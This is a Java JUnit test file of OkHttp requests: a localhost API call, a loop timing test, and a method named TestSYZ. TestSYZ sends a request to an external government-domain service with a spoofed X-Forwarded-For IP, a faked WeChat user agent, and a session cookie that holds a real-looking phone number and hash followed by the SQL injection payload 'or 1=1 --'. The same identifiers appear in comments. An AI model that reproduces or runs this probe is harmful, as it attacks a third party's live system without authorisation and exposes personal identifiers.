package com.kee.controller;

import com.kee.utill.IPUtil;
import okhttp3.*;
import org.junit.Test;

import java.io.IOException;
import java.util.Date;
import java.util.List;

/**
 * Created by kee on 2018/1/30.
 */
public class ApiTest {
    public static OkHttpClient okHttpClient = new OkHttpClient.Builder().build();
    public static final String BaseUrl = "http://localhost:8080/api/";

    //    http://localhost:63342/JavaWebMaster/src/main/webapp/html/EasyUiDemo.html?_ijt=ptmre7gsc32i0pmqrhkkr1uaha
    @Test
    public void TestHello() throws IOException {
        Request request = new Request.Builder().get().url(BaseUrl + "hello?date=2018-10-10 12:11:10")
                .addHeader("User-Agent", IPUtil.getWeixinClient())
                .addHeader("X-Forwarded-For", IPUtil.getHanDanRandomIp())
                .addHeader("version", "10")
                .addHeader("timestamp", String.valueOf(new Date().getTime()))
                .build();
        Call call = okHttpClient.newCall(request);
        Response execute = call.execute();
        Headers headers = execute.headers();
        List<String> values = headers.values("Set-Cookie");
        for (String value : values) {
            System.out.println("Set-Cookie:" + value);
        }
        System.out.println(execute.toString() + "\n" + execute.body().string());
    }

    //13832003776|e7585fe7a2c47ada0c36afa9159526a3
    @Test
    public void TestSYZ() throws IOException {
//        13601315001
        Request request = new Request.Builder().get().url("http://syz.bjchfp.gov.cn/maw/service/app/userInfo")
                .addHeader("User-Agent", IPUtil.getWeixinClient())
                .addHeader("X-Forwarded-For", IPUtil.getHanDanRandomIp())
                .addHeader("Cookie", "__SESSION_USER_LOGIN_KEY=13832003776|e7585fe7a2c47ada0c36afa9159526a3 or 1=1 --;")
                .build();
        Call call = okHttpClient.newCall(request);
        Response execute = call.execute();
        System.out.println(execute.body().string());
    }

    /**
     * 1000W: js 690 java 8
     * 10000w: js 7365 java 43
     */
    @Test
    public void TestJsAndJavaSpeed() {
        Date date = new Date();
        long sum = 0;
        for (int i = 0; i < 100000000; i++) {
            sum += i;
        }
        Date date1 = new Date();
        System.out.println(sum);
        System.out.println(date1.getTime() - date.getTime());
    }


}
